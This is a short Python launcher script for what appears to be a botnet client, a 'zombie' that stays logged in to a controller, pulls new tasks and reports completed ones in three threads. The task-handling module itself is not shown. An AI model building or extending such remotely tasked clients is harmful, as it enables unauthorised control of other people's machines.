#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import threading
from app import zombie

def main():

    if zombie.run():
        def keep_logged_in(zombie):
            zombie.keep_logged_in()

        def get_new_tasks(zombie):
            zombie.get_new_tasks()

        def post_completed_tasks(zombie):
            zombie.post_completed_tasks()

        # def do_tasks(zombie):
        #     zombie.keep_logged_in()

        thread1 = threading.Thread(name='keep_logged_in', target=keep_logged_in, args=((zombie,)))
        # thread1.setDaemon(True)
        thread1.start()

        thread2 = threading.Thread(name='get_new_tasks', target=get_new_tasks, args=((zombie,)))
        # thread2.setDaemon(True)
        thread2.start()

        thread3 = threading.Thread(name='post_completed_tasks', target=post_completed_tasks, args=((zombie,)))
        # thread3.setDaemon(True)
        thread3.start()
